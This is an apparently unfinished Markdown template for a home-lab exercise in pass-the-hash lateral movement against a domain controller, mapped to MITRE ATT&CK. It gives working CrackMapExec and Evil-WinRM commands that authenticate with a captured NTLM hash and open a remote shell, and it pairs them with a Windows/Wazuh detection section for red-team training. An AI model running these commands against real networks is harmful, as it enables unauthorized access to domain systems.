# Lateral Movement — Pass-the-Hash

**ATT&CK Technique:** [T1550.002 — Pass the Hash](https://attack.mitre.org/techniques/T1550/002/) · [T1021.006 — Remote Services: WinRM](https://attack.mitre.org/techniques/T1021/006/)  
**Tactic:** Lateral Movement  
**Environment:** TLOA Lab (`tloa.local`)  
**Prerequisite:** Hash obtained from T1003.001 (Credential Dumping — LSASS)  
**Date:** <!-- YYYY-MM-DD -->  
**Status:** ⬜ Pending  

---

## Objective

Using NTLM hashes previously captured from LSASS (T1003.001), authenticate to DC01 without knowing the plaintext password — simulating post-credential-access lateral movement within the domain.

---

## Tools Used

| Tool | Version | Purpose |
|---|---|---|
| CrackMapExec (NetExec) | Latest | PTH via SMB/WinRM |
| Evil-WinRM | Latest | Interactive shell via WinRM |
| Impacket (`psexec.py`) | Latest | Remote execution via PTH |

---

## Execution

### Step 1 — Validate hash via SMB (CrackMapExec)

```bash
crackmapexec smb 192.168.204.X -u Administrator -H <NTLM_HASH>
```

Look for `(Pwn3d!)` in output — confirms local admin access.

---

### Step 2 — Get interactive shell (Evil-WinRM)

```bash
evil-winrm -i 192.168.204.X -u Administrator -H <NTLM_HASH>
```

---

### Step 3 — Confirm access on DC01

```powershell
# Inside Evil-WinRM session
whoami
hostname
ipconfig
```

---

## Evidence

| Screenshot | Description |
|---|---|
| `img/01-cme-pwnage.png` | CME confirming PTH success |
| `img/02-winrm-shell.png` | Evil-WinRM shell on DC01 |
| `img/03-whoami-dc01.png` | Confirmed access as Administrator |

---

## Detection — Wazuh / Sysmon

### Was it detected?

| SIEM | Alert | Event ID | Result |
|---|---|---|---|
| Wazuh | PTH / NTLM anomaly | — | <!-- ✅ / ❌ --> |
| Sysmon | Network connection (Event 3) | 3 | <!-- ✅ / ❌ --> |
| Windows | Logon Type 3 (Network) | 4624 | <!-- ✅ / ❌ --> |

### Key Indicator

Windows Security Event **4624** with `Logon Type: 3` and `Authentication Package: NTLM` from a non-standard source IP is the primary detection indicator for PTH.

### Analysis

<!-- Fill after running exercise and reviewing Wazuh alerts -->

---

## Lessons Learned

<!-- Fill after completing the exercise -->

---

## References

- [MITRE ATT&CK — T1550.002](https://attack.mitre.org/techniques/T1550/002/)
- [MITRE ATT&CK — T1021.006](https://attack.mitre.org/techniques/T1021/006/)
- [CrackMapExec / NetExec Docs](https://www.netexec.wiki/)
